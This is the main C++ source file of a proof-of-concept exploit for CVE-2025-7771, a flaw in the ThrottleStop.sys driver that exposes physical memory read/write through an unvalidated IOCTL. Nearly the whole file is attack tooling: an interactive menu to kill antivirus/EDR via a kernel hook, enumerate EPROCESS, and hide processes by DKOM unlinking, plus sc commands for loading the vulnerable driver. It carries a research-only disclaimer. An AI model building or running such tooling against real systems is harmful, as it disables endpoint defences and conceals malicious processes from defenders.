// CVE-2025-7771 - ThrottleStop.sys MmMapIoSpace Exploit PoC
// Physical memory read/write via unvalidated IOCTL -> arbitrary kernel R/W
//
// For educational / authorized security research use only.
// Tested on Windows 10 22H2 and Windows 11 23H2/24H2 (x64).

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <cstdio>
#include <cstdlib>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "advapi32.lib")

#include "kernel.h"
#include "driver.h"
#include "physmem.h"
#include "exploits.h"

// ==================== Console colors ====================
static HANDLE g_hConsole;
static WORD   g_origAttr;

#define C_RED    (FOREGROUND_RED | FOREGROUND_INTENSITY)
#define C_GREEN  (FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define C_YELLOW (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define C_CYAN   (FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)
#define C_WHITE  (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)
#define C_RESET  g_origAttr

static void InitConsole() {
    g_hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hConsole, &csbi);
    g_origAttr = csbi.wAttributes;
    // Enable ANSI/VT processing for Windows 10+
    DWORD mode;
    GetConsoleMode(g_hConsole, &mode);
    SetConsoleMode(g_hConsole, mode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
}

static void Color(WORD c) { SetConsoleTextAttribute(g_hConsole, c); }

static void Banner() {
    InitConsole();
    Color(C_RED);
    printf("\n");
    printf("   ThrottleStop.sys - CVE-2025-7771 PoC\n");
    printf("\n");
    Color(C_WHITE);
    printf("   ThrottleStop.sys  MmMapIoSpace Exploit PoC\n");
    printf("   Arbitrary Physical Memory Read/Write via IOCTL Abuse\n");
    Color(C_YELLOW);
    printf("   For authorized security research and education only.\n");
    Color(C_RESET);
    printf("\n");
}

static void Menu() {
    Color(C_CYAN);
    printf("  +---------------------------------------------+\n");
    printf("  |  1  |  Kill AV/EDR (NtAddAtom kernel hook)  |\n");
    printf("  |  2  |  Enumerate EPROCESS list               |\n");
    printf("  |  3  |  Hide process (DKOM unlink)            |\n");
    printf("  |  0  |  Exit                                  |\n");
    printf("  +---------------------------------------------+\n");
    Color(C_RESET);
    printf("  Choice> ");
}

int main() {
    Banner();

    // ---- Open driver handle ----
    Color(C_WHITE);
    printf("[*] Opening \\\\.\\ThrottleStop device...\n");
    Color(C_RESET);

    ThrottleStopDriver drv;
    if (!drv.Open()) {
        DWORD err = GetLastError();
        Color(C_RED);
        printf("[-] CreateFile failed (error %lu)\n", err);
        Color(C_RESET);
        if (err == ERROR_FILE_NOT_FOUND) {
            printf("    Driver not loaded. Load it with:\n");
            printf("      sc create ThrottleStop binPath= \"C:\\path\\to\\ThrottleStop.sys\" type= kernel\n");
            printf("      sc start ThrottleStop\n");
        } else if (err == ERROR_ACCESS_DENIED) {
            printf("    Unexpected - CVE-2025-7771 allows non-admin access to the device.\n");
            printf("    A security product may be blocking the handle. Check EDR/AV logs.\n");
        }
        return 1;
    }
    Color(C_GREEN);
    printf("[+] Driver handle acquired.\n\n");
    Color(C_RESET);

    // ---- Probe read IOCTL ----
    if (!drv.Probe()) {
        Color(C_RED);
        printf("[-] Could not detect a working read format.\n");
        Color(C_RESET);
        return 1;
    }
    printf("\n");

    // ---- Select and validate EPROCESS offsets ----
    const EprocessOffsets& offsets = SelectOffsets();

    // ---- Initialize physical memory explorer ----
    PhysMemExplorer mem(drv, offsets);
    if (!mem.Init()) {
        Color(C_RED);
        printf("[-] Physical memory explorer initialization failed.\n");
        printf("    Ensure you are running on bare-metal or non-HVCI VM.\n");
        printf("    Ensure SysMain is running: sc start SysMain\n");
        Color(C_RESET);
        return 1;
    }

    // ---- Interactive menu ----
    int choice = -1;
    while (choice != 0) {
        Menu();
        if (scanf_s("%d", &choice) != 1) {
            while (getchar() != '\n');
            continue;
        }

        printf("\n");
        switch (choice) {
        case 1:
            Color(C_RED);
            printf("  ========== Kill AV/EDR - NtAddAtom Kernel Hook ==========\n");
            Color(C_RESET);
            ExploitDisableAVEDR(mem);
            break;
        case 2:
            Color(C_CYAN);
            printf("  ========== EPROCESS List ==========\n");
            Color(C_RESET);
            DumpEprocessList(mem);
            break;
        case 3:
            Color(C_YELLOW);
            printf("  ========== Hide Process - DKOM ActiveProcessLinks Unlink ==========\n");
            Color(C_RESET);
            ExploitHideProcess(mem);
            break;
        case 0:
            break;
        default:
            printf("  Invalid choice.\n");
        }
        printf("\n");
    }

    printf("[*] Exiting.\n");
    return 0;
}
